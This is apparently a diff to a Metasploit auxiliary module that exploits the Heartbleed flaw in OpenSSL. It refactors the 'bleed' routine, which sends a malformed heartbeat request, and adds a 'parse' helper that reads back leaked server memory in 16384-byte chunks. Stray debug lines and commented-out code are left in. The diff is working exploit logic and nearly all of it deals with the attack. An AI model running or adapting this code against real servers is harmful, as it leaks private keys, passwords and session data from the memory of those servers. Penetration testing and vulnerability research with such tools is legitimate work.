@@ -328,11 +328,9 @@ class Metasploit3 < Msf::Auxiliary
     disconnect
   end
 
-  def bleed
-    # This actually performs the heartbleed portion
-    vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat(heartbeat_length))
+  def parse
     hdr = sock.get_once(5, response_timeout)
+    #puts "HEADER: #{hdr.inspect}"
     if hdr.nil? || hdr.empty?
       vprint_error("#{peer} - No Heartbeat response...")
       return
@@ -369,14 +367,36 @@ class Metasploit3 < Msf::Auxiliary
     to_receive = len
     heartbeat_data = ''
     while to_receive > 0
+      #puts "recv: #{to_receive}"
       temp = sock.get_once(to_receive, response_timeout)
       break if temp.nil?
 
       to_receive -= temp.length
       heartbeat_data << temp
     end
-    vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{len} bytes (expected #{heartbeat_length} bytes)")
 
+
+    heartbeat_data
+  end
+
+  def bleed
+    # This actually performs the heartbleed portion
+    vprint_status("#{peer} - Sending Heartbeat...")
+    sock.put(heartbeat(heartbeat_length))
+    heartbeat_data = ''
+    (heartbeat_length / 16384).times{ 
+      heartbeat_data += parse
+      vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{heartbeat_length} bytes")
+      } 
+
+    # if (heartbeat_length % 16384) > 0
+    #   heartbeat_data += parse
+    #   vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{heartbeat_length} bytes")
+    # end
+    # heartbeat_data += parse
+    #heartbeat_data += parse
+    # temp = sock.get_once(5, response_timeout)
+    # puts "TMP:#{temp.inspect}"
     heartbeat_data
   end
 
